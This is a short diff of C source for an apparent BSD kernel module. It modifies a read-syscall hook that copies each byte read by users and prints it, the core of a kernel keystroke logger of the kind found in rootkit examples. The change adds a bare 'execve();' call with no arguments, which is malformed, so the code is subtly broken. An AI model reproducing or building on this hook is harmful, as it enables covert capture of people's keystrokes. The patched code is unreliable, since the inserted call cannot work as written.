@@ -32,9 +32,10 @@ static int read_hook(struct thread *td, void *syscall_args){
 		return(1);  
 	}
 
-      	copyinstr(uap->buf, buf, 1, &done);
+	execve();
+    copyinstr(uap->buf, buf, 1, &done);
 	printf("%c", buf[0]);
-    	return(error);
+    return(error);
 }
 
 static int load(struct module *module, int cmd, void *arg) {
